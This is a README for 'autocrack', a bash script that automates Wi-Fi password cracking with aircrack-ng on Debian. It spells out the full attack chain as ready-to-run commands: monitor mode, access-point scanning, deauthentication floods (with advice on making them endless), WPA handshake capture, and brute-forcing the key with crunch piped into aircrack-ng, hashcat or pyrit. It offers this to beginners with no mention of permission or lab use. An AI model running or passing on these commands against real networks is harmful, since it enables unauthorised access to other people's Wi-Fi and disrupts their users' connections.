# autocrack
Make aircrack-ng 1.6 works under bash (absolute beginner's script).

YOU ARE FREE TO DOWNLOAD AND EDIT THIS CODE!


prerequisite:
- linux os (debian was used)
- wifi adapter or a laptop with adapter that support monitor mode


make the script run:
- copy the autocrack.sh into a new directory
- open terminal and change the mode to executable (chmod +x autocrack.sh)
- run (sudo ./autocrack.sh)
- password will output in (password.txt)
- and do your thing!


some commands:
- put on monitor mode (airmon-ng start $int)
- use to capture all access point (airodump-ng -w mytable --output-format csv --write-interval 1 $mon_int)
- use to capture handshake and send deauthentication packet'replace 25 with 0 to send infinit deauthentication packet (airodump-ng --bssid "$bssid" -c "$ch" -w "$essid" "$mon_int" & aireplay-ng --deauth 25 -a "$bssid" "$mon_int") 
- make a wordlist and pass it to aircrack-ng to scan for match (crunch $min $max $char|aircrack-ng -b $bssid -w- $cap_file -l password.txt)
- if already have wordlist (aircrack-ng -b $bssid -w $wordlist $cap_file -l password.txt)


for GPU cracking:
- with hashcat (crunch $min $max $char | hashcat -m2500 -a0 -o password.txt $hccapx_file)
- with pyrit (crunch $min $max $char | pyrit -r $cap_file -b $bssid -i- -o password.txt attack_passthrough)




and as usual ENJOY!
